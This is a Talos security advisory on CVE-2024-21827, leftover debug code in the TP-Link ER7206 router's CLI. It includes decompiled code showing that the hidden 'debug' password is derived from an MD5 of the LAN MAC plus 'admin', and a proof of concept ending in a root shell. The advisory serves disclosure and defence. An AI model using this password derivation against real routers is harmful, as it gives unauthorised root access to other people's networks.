# Talos Vulnerability Report

### TALOS-2024-1947

## Tp-Link ER7206 Omada Gigabit VPN Router cli\_server debug leftover debug code vulnerability

##### June 25, 2024

##### CVE Number

CVE-2024-21827

##### SUMMARY

A leftover debug code vulnerability exists in the cli\_server debug functionality of Tp-Link ER7206 Omada Gigabit VPN Router 1.4.1 Build 20240117 Rel.57421. A specially crafted series of network requests can lead to arbitrary command execution. An attacker can send a sequence of requests to trigger this vulnerability.

##### CONFIRMED VULNERABLE VERSIONS

The versions below were either tested or verified to be vulnerable by Talos or confirmed to be vulnerable by the vendor.

Tp-Link ER7206 Omada Gigabit VPN Router 1.4.1 Build 20240117 Rel.57421

##### PRODUCT URLS

ER7206 Omada Gigabit VPN Router - <https://www.tp-link.com/us/business-networking/vpn-router/er7206/>

##### CVSSv3 SCORE

7.2 - CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H

##### CWE

CWE-489 - Leftover Debug Code

##### DETAILS

The ER7206 Omada Gigabit VPN Router is a high-performance networking solution that supports gigabit connectivity, highly secure VPN and integration with Omada SDN for centralized cloud management and zero-touch provisioning.

The ER7206 router has a “Remote Assistance” functionality, when enabled it is possible to SSH into the router using the same admin credentials of the web portal.

After the SSH login the user has available a router cli shell:

```
>help

Commands available:
help                                                 Show available commands
exit                                                 Exit from current mode
enable                                               Turn on privileged commands
disable                                              Turn off privileged commands

```

The help command prints the available commands that the user can execute, that are limited in functionalities. There is an hidden command called `debug`, following the `cli_server`’s `cli_debug_command` function that is responsible to handle that command:

```
undefined8 cli_debug_command(undefined8 terminal_related)

{
    [...]
[1] ret = uac_com_get_dev_mac(&LAN_MAC);
    [...]
    error = 0;
[2] snprintf((char *)&mac_plus_admin,0x17,"%02X:%02X:%02X:%02X:%02X:%02Xadmin",
            (ulonglong)LAN_MAC._0_1_,(ulonglong)LAN_MAC._1_1_,(ulonglong)LAN_MAC._2_1_,
            (ulonglong)(byte)LAN_MAC,(ulonglong)local_44._0_1_,(ulonglong)(byte)local_44);
    mac_plus_admin_len = strlen((char *)&mac_plus_admin);
[3] md5_hexdigest(&mac_plus_admin,mac_plus_admin_len,mac_plus_admin_hex_digest,0x20);
    cli_print_no_enter(terminal_related,"Enter your password: ");
    [...]
    idx = 0;
    [...]
    while( true ) {
        [...]
        read_size = read(terminal,terminal_input_one_char,1);
        if (read_size < 0) break;
        input_char = (ulonglong)terminal_input_one_char[0];
        if (read_size == 0) goto check_password;
        if (((-1 < input_char) [...]) && input_char != 0)) {
            if (input_char == '\r') goto check_password;
            if (idx < 0x10) {
                terminal_input[idx] = terminal_input_one_char[0];
                idx = (longlong)((int)idx + 1);
            }
            else {
                error = -1;
            }
        }
    }
    [...]
check_password:
    if (error != -1) {
        if (error != 0) {
        return 0;
        }
[4]     is_eq = strncmp(mac_plus_admin_hex_digest,terminal_input,0x10);
        if (is_eq == 0) {
[5]         system_shell_wrap();
            return 0;
        }
    }
    [...]
}

```

This functionality asks for a password, if the password is correct the user is guaranteed a full linux shell.

At `[1]`, it is fetched the LAN MAC address of the device, this is then used, at `[2]`, to compose the `<LAN_MAC>admin` string. At `[3]` the MD5 of the composed string is calculated, then at `[4]` the first 16 bytes of the MD5 hex-digest is compared with the provided password, if the two are equal then the code at `[5]` is reached. At `[5]` the `system_shell_wrap` function is called, that will guarantee to the user a full linux shell.

### Exploit Proof of Concept

The first thing to do is to enable the “Remote Assistance” in the web portal, after that it’s possible to SSH into the router:

```
ssh -oHostKeyAlgorithms=+ssh-rsa -oKexAlgorithms=diffie-hellman-group14-sha1 POC@192.168.0.1
POC@192.168.0.1's password:

>help

Commands available:
help                                                 Show available commands
exit                                                 Exit from current mode
enable                                               Turn on privileged commands
disable                                              Turn off privileged commands

```

The cli console offers a limited number of commands, if the hidden command `debug` is provided the cli would ask for a password:

```
>debug
Enter your password:

BusyBox v1.22.1 (2024-01-16 18:32:23 CST) built-in shell (ash)
Enter 'help' for a list of built-in commands.

_______                     ________        __
|       |.-----.-----.-----.|  |  |  |.----.|  |_
|   -   ||  _  |  -__|     ||  |  |  ||   _||   _|

        |__| W I R E L E S S   F R E E D O M

BARRIER BREAKER (Barrier Breaker, unknown)

* 1/2 oz Galliano         Pour all ingredients into
* 4 oz cold Coffee        an irish coffee mug filled
* 1 1/2 oz Dark Rum       with crushed ice. Stir.
* 2 tsp. Creme de Cacao
-----------------------------------------------------
root@ER7206:/#

```

If the password is correct the user would obtain a full linux shell.
